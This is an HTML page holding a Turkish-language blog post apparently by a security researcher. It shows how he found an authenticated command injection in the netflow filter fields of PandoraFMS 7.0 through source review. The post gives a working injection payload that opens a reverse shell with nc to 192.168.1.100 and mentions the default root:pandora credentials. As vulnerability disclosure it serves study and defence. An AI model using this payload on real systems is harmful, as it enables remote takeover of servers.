@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A Pathetic Soul, ">
+
+
+        <title>PANDORAFMS 7.0 AUTHENTICATED REMOTE CODE EXECUTION</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/engindemirbilek.html" title="See posts by EnginDemirbilek">
+                </a>
+                <h2 class="article-info">EnginDemirbilek</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Sun 08 July 2018</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>PANDORAFMS 7.0 Authenticated Remote Code Execution Zafiyeti</h1>
+                        <p class="post-meta">
+                            // under                         </p>
+                </header>
+            </section>
+            <p>Merhaba, PANDORAFMS adında açık kaynaklı bir ağ izleme aracında bulduğum Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım.
+            Statik kaynak kod analizine dair türkçe pek bir kaynak bulunmuyor oluşunu göz önünde bulundurarak makaleyi türkçe kaleme aldım.</p>
+
+<p><strong>AUTHENTICAD RCE </strong></p>
+<p>Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. Rce ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.</p><div class="highlight"><pre><span></span>2F81CFBCD6E3DF802856664E22FEAEB0 (NTLM HASH)
+</pre></div>
+
+<strong>PANDORAFMS </p>
+<ol>
+<li>Uygulama indirme linki: https://pandorafms.org/features/free-download-monitoring-software/</li>
+<li>Zafiyeti tespit ettiğim sürüm: 7.0</li>
+</ol>
+
+
+<p><strong>BÖLÜM 1: Uygulama Eldesi</p>
+<p>Profesyonel bir kaynak kod analizicisi değilim bu sebeple zafiyet bulmanın kendime göre en basit olacağı uygulama türleri sınıflandırdım.
+Bunların başında ise ağ izleme yazılımları geliyor. Ufak bir arama sonucu PANDORAFMS yazılımına rastladım, hem açık kaynaklıydı hemde indirme linklerinde
+doğrudan sanallaştırma yazılımlarıyla kullanılabilecek bir OVA dosyası bulunuyordu. Doğrudan bir OVA dosyası bulunması, uygulamanın kaynak kodlarına erişimde işleri oldukça kolaylaştırıyor.
+OVA dosyasını indirdim ve <a href="https://www.vmware.com/products/fusion.html">VMWARE Fusion</a> ile sanal makine olarak kaldırdım.</p><br>
+
+<p><strong>Bölüm 2: Kaynak Kod Eldesi</strong></p><br>
+<p>Sanal makineye giriş yapmak için dağımtıcının kendi sağladığı <a href= https://pandorafms.com/downloads/guias_rapidas_EN.pdf>kılavuz</a> üzerinden root:pandora giriş bilgisini aldım ve sisteme giriş yaptım.</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms.png"></p>
+<p>Sistem üzerinde biraz gezindikten sonra, uygulamaya dair kodların varsayılan webservisi dizini olan /var/www/html dizininde tutulduğunu tespit ettim.</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-kaynak.png"></p>
+<p>Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini <a href="https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1">TAR</a> ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.</p>
+<div class="highlight"><pre><span></span>tar -czvf pandora.tar.gz /var/www/html/pandora_console
+    scp root@pandoraFMSIP:/var/www/html/pandora.tar.gz /tmp/pandora.tar.gz
+</pre></div><br>
+
+
+<p><strong>Bölüm 3: Kaynak Kodun İncelenmesi</strong></p><br>
+<p>Dosyaları kendi tercih ettiğim <a href="https://atom.io/"> ATOM idesini kullanarak kurcalamaya başladım.</p>
+<p>Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyorsak başlı başlı dikkat etmemiz gereken bazı fonksiyonlar var. Bunların bir kaçına örnek olarak;
+  <code>
+system, exec, shell_exec, popen, eval
+  <code>
+  fonksiyonları verilebilir.
+</p>
+<p> IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çabalanan, sanırım beceriksizim, bir b*k bulamıyorum gibi düşüncelerle geçirilen bir kaç saatin sonunda functions_netflow.php dosyasının 648. satırında zafiyete dair çok umut vaadeden bir nokta tespit ettim.
+  <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow.png"></p>
+<p>Hem <strong>exec()</strong> fonksiyonu kullanılıyor hemde henüz nerenden geldiği belli olmayan ama ben kullanıcıdan geliyorum diye bağıran bir <stron>$command</stron> değişkeni içeriyordu.
+Fazla Kemal Sunal izlemenin etkisinden olacak "Şimdi Ananı Laciverde Boyadım" diye aklımdan geçirerek <strong>$command</strong> değişkeninin nereden geldiğini kurculamaya başladım.
+</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-command.png"></p>
+<p>$command değişkeni <strong>net_flow_getcommand()</strong> fonksiyonundan geliyor, daha sonrada önceden tanımlanmış ekstra bir kaç komutta üstüne ekleniyordu.
+IDE'nin arama özelliğini kullanarak fonksiyonun aynı dosyada 892.nci satırda tanımlandığını tespit ettim.</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-fonksiyon.png"></p>
+<p>
+Fonksiyonu inclediğimde maalesef kullanıcıdan gelen herhangi bir verinin burada $command değişkenine eklenmediğini gördüm.
+</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png"></p>
+<p>
+Fakat bereket olsun, $command değişkenine bir şeyler ekleyen yeni fonksiyon çıktı karşıma 904. satırda bulunan <strong>netflow_get_filter_arguments</strong> fonksiyonu. "Hadi yavrum rastgele" diyerek fonksiyonun tanımlandığı noktayı tespit ettim (aynı dosya 917. satır) ve fonksiyonu incelemeye koyuldum.
+</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-getfilter-fonksiyon.png"></p>
+<p>Fonksiyon bir sürü farklı girdiyi(ipsrc, ipdst, srcport, dstport) herhangi bir kontrolden $filter_args adında bir değişkene ekliyor ve en sonunda $filter_args değişkenini değer olarak dönüyordu.
+  Daha sonra bu değer, $command değişkenine ekleniyor ve ilk tespit edilen satırda bulunan exec() fonksiyonuna gönderiliyordu. Yani eğer bu değişkenlerden herhangi birine istediğimiz girdiyi verebilirsek pekala buradan bir RCE elde edebiliriz.
+Aslında aradığım şey $_GET yada $_POST şekilinde kullanıcıdan alınan bir girdiydi fakat bu değişkenlerin hiç birinin geleneksel GET yada POST ile alındığını tespit edemedim. RCE hem çok yakındı hemde çok uzak "Yanımdasın ama dokunamıyorum çok saçma !".
+Bu durum canımı oldukça sıkmış olsada fonksiyonun içinde bulunan değerler adeta ben bul beni yiğidim der gibi gözüme bakıyordu. Uzunca bir süre bu değişkenlerin nasıl alındığı tespit etmeye çalıştım ama yeteri kadar tecrübeli olmamandan ötürü olsa gerek bulamadım.
+Biraz kafa toplamak amacıyla bir cool bir starbucks boy olarak white choclate mocha arası verdim. Bu noktada aslında yine bir şey bulamadığımı düşünüp bırakacaktım ki, aykırı bir tutum sergileyerek googleda ufak bir arama yaptım.</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-google.png"></p>
+<p>Buradan dökümanları okumanın ne kadar önemli olduğunu tekrar alıyoruz. Site üzerinde biraz gezindikten sonra, heyecanımı tekrar kazandıran bir ekran görüntüsüne denk geldim</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-google-netflow-dokuman.png"></p>
+<p>Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, bingo !. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim: </p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-page.png"></p>
+<p>Sayfaya girdiğim an kafamda "Hanım hanım, bunlar benim yavrularım" sesleri yankılandı. Artık önümdeydi gelmekte olan, şimdi tek iş uygun payloadı yapıştırmaktı.
+Fonksiyon tanımlarına tekrar döndüm, netflow_get_filter_arguments fonksiyonun sonunda $filter_args değişkenine " karakteri eklediğini gördüm.
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son-dokunuslar.png"></p>
+Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi.
+Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak.
+Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>den bir reverseshell komutu aşırdım.
+Ve sonuç payloadı: <strong>";nc -e /bin/sh 192.168.1.100 1234 #</strong> olarak oluştu.
+Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde, mutlu son...
+</p>
+<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son.png"></p>
+
+<br><br>
+<p>
+Dağıtımcıya ulaşmaya çalıştım fakat herhangi bir yanıt alamadım. Bu sebeple makaleyi açık olarak paylaştım.
+Sayfada 4 adet RCE bulunuyor yani aslında bu 4 tane RCE zafiyeti bulumunun bir makalesi oldu. Bu uygulamayla herhangi bir işim olmamasından mütevellit, SQL injection araştırıp zafiyeti Unauthenticated RCE gibi daha zorlu zafiyetlere zincirlemeyle henüz uğraşmadım.
+Ilerleyen günlerde becerebilirsem, bir Unauthenticated RCE exploiti paylaşmaya çalışacağım.
+</p>
+
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; A Pathetic Soul &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
